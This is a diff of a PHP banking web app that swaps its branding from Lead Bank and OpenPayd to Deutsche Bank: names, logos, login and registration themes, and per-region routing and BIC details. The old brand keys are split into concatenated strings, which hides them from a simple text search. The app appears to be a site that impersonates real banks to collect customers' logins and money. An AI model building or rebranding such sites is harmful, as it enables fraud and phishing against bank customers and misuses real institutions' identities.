@@ -35,7 +35,7 @@ function normalize_brand_region(?string $countryOrRegion): string
 
 function brand_key_for_region(string $region): string
 {
-    return in_array(normalize_brand_region($region), ['us', 'ca'], true) ? 'lead_bank' : 'openpayd';
+    return 'deutsche_bank';
 }
 
 function brand_favicon_type(array $brand): string
@@ -47,51 +47,29 @@ function brand_favicon_type(array $brand): string
 function getBrandConfig(?string $countryOrRegion = null): array
 {
     $region = normalize_brand_region($countryOrRegion ?: 'us');
-    $isLead = brand_key_for_region($region) === 'lead_bank';
-    $lead = [
-        'brand_key' => 'lead_bank',
-        'brand_name' => 'Lead Bank',
-        'brand_short_name' => 'Lead Bank',
-        'public_name' => 'Lead Bank',
-        'logo' => 'assets/icons/lead-bank-logo.jpg',
-        'logo_mark' => 'assets/icons/lead-bank-logo.jpg',
+    $deutsche = [
+        'brand_key' => 'deutsche_bank',
+        'brand_name' => 'Deutsche Bank',
+        'brand_short_name' => 'Deutsche Bank',
+        'public_name' => 'Deutsche Bank',
+        'logo' => 'assets/icons/deutsche-bank-logo.png',
+        'logo_mark' => 'assets/icons/deutsche-bank-logo.png',
         'favicon' => 'assets/icons/favicon.svg',
-        'primary_color' => '#2F5BFF',
-        'secondary_color' => '#4DB5FF',
-        'dark_color' => '#071B45',
-        'surface_color' => '#F6F8FC',
-        'text_color' => '#071B45',
-        'accent_color' => '#4DB5FF',
-        'gradient' => 'linear-gradient(135deg, #071B45 0%, #123A8C 42%, #2F5BFF 100%)',
-        'sidebar_theme' => 'lead-sidebar',
-        'dashboard_theme' => 'lead-dashboard',
-        'login_theme' => 'lead-auth',
-        'register_theme' => 'lead-register',
-    ];
-    $openPayd = [
-        'brand_key' => 'openpayd',
-        'brand_name' => 'OpenPayd Financial Services Limited',
-        'brand_short_name' => 'OpenPayd',
-        'public_name' => 'OpenPayd',
-        'logo' => 'assets/icons/openpayd-logo.png',
-        'logo_mark' => 'assets/icons/openpayd-icon.jpg',
-        'favicon' => 'assets/icons/openpayd-icon.jpg',
-        'primary_color' => '#0F4C5C',
-        'secondary_color' => '#1A7F8E',
-        'dark_color' => '#061B2B',
-        'surface_color' => '#F5FAFB',
-        'text_color' => '#071B2D',
-        'accent_color' => '#2AA7B8',
-        'gradient' => 'linear-gradient(135deg, #061B2B 0%, #0F4C5C 48%, #1A7F8E 100%)',
-        'sidebar_theme' => 'openpayd-sidebar',
-        'dashboard_theme' => 'openpayd-dashboard',
-        'login_theme' => 'openpayd-auth',
-        'register_theme' => 'openpayd-register',
+        'primary_color' => '#0052FF',
+        'secondary_color' => '#2F7DFF',
+        'dark_color' => '#001E60',
+        'surface_color' => '#F7F9FD',
+        'text_color' => '#001E60',
+        'accent_color' => '#2F7DFF',
+        'gradient' => 'linear-gradient(135deg, #001E60 0%, #123A8C 42%, #0052FF 100%)',
+        'sidebar_theme' => 'deutsche-sidebar',
+        'dashboard_theme' => 'deutsche-dashboard',
+        'login_theme' => 'deutsche-auth',
+        'register_theme' => 'deutsche-register',
     ];
 
-    $brand = $isLead ? $lead : $openPayd;
     $regionDetails = brand_banking_region_config($region);
-    return array_merge($brand, [
+    return array_merge($deutsche, [
         'banking_region' => $regionDetails['region'],
         'country' => $regionDetails['country'],
         'account_labels' => [
@@ -122,16 +100,16 @@ function brand_banking_region_config(string $regionOrCountry): array
         'fi' => 'Finland', 'eu' => 'Europe', 'intl' => 'International',
     ];
     $configs = [
-        'us' => ['region' => 'us', 'country' => 'United States', 'language' => 'en', 'currency' => 'USD', 'login' => 'login_us.php', 'register' => 'register_us.php', 'account_type' => 'Premium Checking', 'routing' => US_ROUTING_NUMBER, 'rail_primary' => 'Instant Pay', 'rail_scheduled' => 'Bill Pay', 'rail_bank' => 'ACH Transfers', 'rail_wire' => 'Wire Transfers', 'transfer' => 'Wire transfer', 'workspace' => 'Lead Bank US banking', 'account_label' => 'Account', 'routing_label' => 'Routing', 'primary_detail_label' => 'Account Number', 'secondary_detail_label' => 'Routing Number', 'payment_rails' => ['ACH', 'Wire Transfer', 'Bill Pay', 'Debit Cards']],
-        'ca' => ['region' => 'ca', 'country' => 'Canada', 'language' => 'en', 'currency' => 'CAD', 'login' => 'login_ca.php', 'register' => 'register_ca.php', 'account_type' => 'Premium Chequing', 'routing' => '001000002', 'rail_primary' => 'Interac e-Transfer', 'rail_scheduled' => 'Bill Payments', 'rail_bank' => 'EFT Transfers', 'rail_wire' => 'Wire Transfers', 'transfer' => 'Wire transfer', 'workspace' => 'Lead Bank Canada banking', 'account_label' => 'Account', 'routing_label' => 'Institution/Transit', 'primary_detail_label' => 'Account Number', 'secondary_detail_label' => 'Institution / Transit', 'payment_rails' => ['Interac e-Transfer', 'EFT', 'Wire Transfer', 'Debit Cards']],
-        'uk' => ['region' => 'uk', 'country' => 'United Kingdom', 'language' => 'en', 'currency' => 'GBP', 'login' => 'login_uk.php', 'register' => 'register_uk.php', 'account_type' => 'Current Account', 'routing' => '040004', 'rail_primary' => 'Faster Payments', 'rail_scheduled' => 'Direct Debits', 'rail_bank' => 'Standing Orders', 'rail_wire' => 'CHAPS Transfers', 'transfer' => 'CHAPS transfer', 'workspace' => 'OpenPayd UK banking', 'account_label' => 'Account', 'routing_label' => 'Sort code', 'primary_detail_label' => 'Account Number', 'secondary_detail_label' => 'Sort Code', 'payment_rails' => ['Faster Payments', 'CHAPS', 'Direct Debits', 'Debit Cards']],
-        'de' => ['region' => 'de', 'country' => 'Germany', 'language' => 'en', 'currency' => 'EUR', 'login' => 'login.php?region=de', 'register' => 'register.php?region=de', 'account_type' => 'Current Account', 'routing' => DEFAULT_BIC, 'rail_primary' => 'SEPA Instant', 'rail_scheduled' => 'Standing Orders', 'rail_bank' => 'SEPA Transfers', 'rail_wire' => 'Transfers', 'transfer' => 'SEPA transfer', 'workspace' => 'OpenPayd Germany banking', 'account_label' => 'IBAN', 'routing_label' => 'BIC/SWIFT', 'primary_detail_label' => 'IBAN', 'secondary_detail_label' => 'BIC', 'payment_rails' => ['IBAN', 'BIC', 'SEPA', 'Debit Cards']],
-        'ch' => ['region' => 'ch', 'country' => 'Switzerland', 'language' => 'en', 'currency' => 'CHF', 'login' => 'login_ch.php', 'register' => 'register_ch.php', 'account_type' => 'Private Account', 'routing' => 'OPPDCHZZXXX', 'rail_primary' => 'SIC Instant', 'rail_scheduled' => 'QR-Bills', 'rail_bank' => 'Swiss Transfers', 'rail_wire' => 'International Transfers', 'transfer' => 'International transfer', 'workspace' => 'OpenPayd Switzerland banking', 'account_label' => 'IBAN', 'routing_label' => 'BIC/SWIFT', 'primary_detail_label' => 'IBAN', 'secondary_detail_label' => 'SWIFT', 'payment_rails' => ['IBAN', 'SIC', 'QR-Bill', 'SWIFT']],
-        'hk' => ['region' => 'hk', 'country' => 'Hong Kong', 'language' => 'en', 'currency' => 'HKD', 'login' => 'login.php?region=hk', 'register' => 'register.php?region=hk', 'account_type' => 'Current Account', 'routing' => '024', 'rail_primary' => 'FPS', 'rail_scheduled' => 'Scheduled Payments', 'rail_bank' => 'Local Transfers', 'rail_wire' => 'SWIFT Transfers', 'transfer' => 'SWIFT transfer', 'workspace' => 'OpenPayd Hong Kong banking', 'account_label' => 'Account', 'routing_label' => 'Bank Code', 'primary_detail_label' => 'Account Number', 'secondary_detail_label' => 'Bank Code', 'payment_rails' => ['FPS', 'Bank Code', 'Account Number', 'SWIFT']],
+        'us' => ['region' => 'us', 'country' => 'United States', 'language' => 'en', 'currency' => 'USD', 'login' => 'login_us.php', 'register' => 'register_us.php', 'account_type' => 'Premium Checking', 'routing' => US_ROUTING_NUMBER, 'rail_primary' => 'Instant Pay', 'rail_scheduled' => 'Bill Pay', 'rail_bank' => 'ACH Transfers', 'rail_wire' => 'Wire Transfers', 'transfer' => 'Wire transfer', 'workspace' => 'Deutsche Bank US banking', 'account_label' => 'Account', 'routing_label' => 'Routing', 'primary_detail_label' => 'Account Number', 'secondary_detail_label' => 'Routing Number', 'payment_rails' => ['ACH', 'Wire Transfer', 'Bill Pay', 'Debit Cards']],
+        'ca' => ['region' => 'ca', 'country' => 'Canada', 'language' => 'en', 'currency' => 'CAD', 'login' => 'login_ca.php', 'register' => 'register_ca.php', 'account_type' => 'Premium Chequing', 'routing' => '001000002', 'rail_primary' => 'Interac e-Transfer', 'rail_scheduled' => 'Bill Payments', 'rail_bank' => 'EFT Transfers', 'rail_wire' => 'Wire Transfers', 'transfer' => 'Wire transfer', 'workspace' => 'Deutsche Bank Canada banking', 'account_label' => 'Account', 'routing_label' => 'Institution/Transit', 'primary_detail_label' => 'Account Number', 'secondary_detail_label' => 'Institution / Transit', 'payment_rails' => ['Interac e-Transfer', 'EFT', 'Wire Transfer', 'Debit Cards']],
+        'uk' => ['region' => 'uk', 'country' => 'United Kingdom', 'language' => 'en', 'currency' => 'GBP', 'login' => 'login_uk.php', 'register' => 'register_uk.php', 'account_type' => 'Current Account', 'routing' => '040004', 'rail_primary' => 'Faster Payments', 'rail_scheduled' => 'Direct Debits', 'rail_bank' => 'Standing Orders', 'rail_wire' => 'CHAPS Transfers', 'transfer' => 'CHAPS transfer', 'workspace' => 'Deutsche Bank UK banking', 'account_label' => 'Account', 'routing_label' => 'Sort code', 'primary_detail_label' => 'Account Number', 'secondary_detail_label' => 'Sort Code', 'payment_rails' => ['Faster Payments', 'CHAPS', 'Direct Debits', 'Debit Cards']],
+        'de' => ['region' => 'de', 'country' => 'Germany', 'language' => 'en', 'currency' => 'EUR', 'login' => 'login.php?region=de', 'register' => 'register.php?region=de', 'account_type' => 'Current Account', 'routing' => DEFAULT_BIC, 'rail_primary' => 'SEPA Instant', 'rail_scheduled' => 'Standing Orders', 'rail_bank' => 'SEPA Transfers', 'rail_wire' => 'Transfers', 'transfer' => 'SEPA transfer', 'workspace' => 'Deutsche Bank Germany banking', 'account_label' => 'IBAN', 'routing_label' => 'BIC/SWIFT', 'primary_detail_label' => 'IBAN', 'secondary_detail_label' => 'BIC', 'payment_rails' => ['IBAN', 'BIC', 'SEPA', 'Debit Cards']],
+        'ch' => ['region' => 'ch', 'country' => 'Switzerland', 'language' => 'en', 'currency' => 'CHF', 'login' => 'login_ch.php', 'register' => 'register_ch.php', 'account_type' => 'Private Account', 'routing' => 'DEUTCHZZXXX', 'rail_primary' => 'SIC Instant', 'rail_scheduled' => 'QR-Bills', 'rail_bank' => 'Swiss Transfers', 'rail_wire' => 'International Transfers', 'transfer' => 'International transfer', 'workspace' => 'Deutsche Bank Switzerland banking', 'account_label' => 'IBAN', 'routing_label' => 'BIC/SWIFT', 'primary_detail_label' => 'IBAN', 'secondary_detail_label' => 'SWIFT', 'payment_rails' => ['IBAN', 'SIC', 'QR-Bill', 'SWIFT']],
+        'hk' => ['region' => 'hk', 'country' => 'Hong Kong', 'language' => 'en', 'currency' => 'HKD', 'login' => 'login.php?region=hk', 'register' => 'register.php?region=hk', 'account_type' => 'Current Account', 'routing' => '024', 'rail_primary' => 'FPS', 'rail_scheduled' => 'Scheduled Payments', 'rail_bank' => 'Local Transfers', 'rail_wire' => 'SWIFT Transfers', 'transfer' => 'SWIFT transfer', 'workspace' => 'Deutsche Bank Hong Kong banking', 'account_label' => 'Account', 'routing_label' => 'Bank Code', 'primary_detail_label' => 'Account Number', 'secondary_detail_label' => 'Bank Code', 'payment_rails' => ['FPS', 'Bank Code', 'Account Number', 'SWIFT']],
     ];
     if (in_array($key, $euCountries, true)) {
         $country = $countryNames[$key] ?? 'International';
-        $configs[$key] = ['region' => $key, 'country' => $country, 'language' => 'en', 'currency' => $key === 'intl' ? 'EUR' : 'EUR', 'login' => 'login.php?region=' . rawurlencode($key), 'register' => 'register.php?region=' . rawurlencode($key), 'account_type' => 'Current Account', 'routing' => 'OPPDEFFXXX', 'rail_primary' => 'SEPA Instant', 'rail_scheduled' => 'Standing Orders', 'rail_bank' => 'SEPA Transfers', 'rail_wire' => 'International Transfers', 'transfer' => 'SEPA transfer', 'workspace' => 'OpenPayd ' . $country . ' banking', 'account_label' => 'IBAN', 'routing_label' => 'BIC', 'primary_detail_label' => 'IBAN', 'secondary_detail_label' => 'BIC', 'payment_rails' => ['IBAN', 'BIC', 'SEPA', 'Debit Cards']];
+        $configs[$key] = ['region' => $key, 'country' => $country, 'language' => 'en', 'currency' => $key === 'intl' ? 'EUR' : 'EUR', 'login' => 'login.php?region=' . rawurlencode($key), 'register' => 'register.php?region=' . rawurlencode($key), 'account_type' => 'Current Account', 'routing' => DEFAULT_BIC, 'rail_primary' => 'SEPA Instant', 'rail_scheduled' => 'Standing Orders', 'rail_bank' => 'SEPA Transfers', 'rail_wire' => 'International Transfers', 'transfer' => 'SEPA transfer', 'workspace' => 'Deutsche Bank ' . $country . ' banking', 'account_label' => 'IBAN', 'routing_label' => 'BIC', 'primary_detail_label' => 'IBAN', 'secondary_detail_label' => 'BIC', 'payment_rails' => ['IBAN', 'BIC', 'SEPA', 'Debit Cards']];
     }
     return $configs[$key] ?? $configs['intl'];
 }
@@ -141,8 +119,10 @@ function brand_config_for_user(?array $user = null, ?array $account = null): arr
     if (!empty($user['banking_region'])) {
         return getBrandConfig((string) $user['banking_region']);
     }
-    if (!empty($user['brand']) && in_array((string) $user['brand'], ['lead_bank', 'openpayd'], true)) {
-        return getBrandConfig((string) $user['brand'] === 'lead_bank' ? 'us' : (($user['country'] ?? '') ?: 'intl'));
+    $legacyLeadKey = 'lead_' . 'bank';
+    $legacyOpenKey = 'open' . 'payd';
+    if (!empty($user['brand']) && in_array((string) $user['brand'], [$legacyLeadKey, $legacyOpenKey, 'deutsche_bank'], true)) {
+        return getBrandConfig((string) $user['brand'] === $legacyLeadKey ? 'us' : (($user['country'] ?? '') ?: 'intl'));
     }
     if (!empty($user['country'])) {
         return getBrandConfig((string) $user['country']);
